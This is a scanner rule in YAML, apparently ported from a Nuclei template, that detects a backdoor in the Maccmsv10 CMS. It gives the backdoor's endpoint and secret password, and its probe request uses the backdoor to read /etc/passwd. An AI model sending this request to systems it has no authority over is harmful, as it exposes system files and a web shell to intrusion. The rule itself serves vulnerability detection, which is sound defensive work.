schema_version: 1
id: "cortex.community:maccmsv10-backdoor"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Maccmsv10 - Backdoor Remote Code Execution"
  description: "Maccmsv10 contains a backdoor which can be exploited by remote attackers. The backdoor is accessible via the '/index.php/bbs/index/download' endpoint and the special 'getpwd' parameter value of 'WorldFilledWithLove'. Exploitation of this vulnerability will allow remote attackers to execute code. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://github.com/chaitin/xray/blob/master/pocs/maccmsv10-backdoor.yml"
  cwes: [77]
  tags: ["maccmsv10", "rce", "backdoor", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Critical"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request:
      method: "POST"
      path: "/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
      body: "getpwd=WorldFilledWithLove"
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "扫描后门" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "反弹端口" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "文件管理" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
